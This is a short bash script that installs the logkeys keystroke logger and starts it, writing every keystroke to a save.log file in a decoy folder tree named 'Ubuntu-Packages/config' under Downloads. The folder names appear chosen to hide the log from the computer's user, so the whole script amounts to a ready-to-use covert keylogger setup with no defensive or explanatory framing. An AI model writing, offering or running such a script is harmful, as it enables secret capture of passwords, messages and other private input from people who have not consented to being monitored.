#!/bin/bash
sudo apt-get install logkeys
cd Downloads
mkdir Ubuntu-Packages
cd Ubuntu-Packages
mkdir config
mkdir modules
mkdir ext4
mkdir appdata
cd config
touch save.log
sudo logkeys --kill
sudo logkeys --start --output save.log
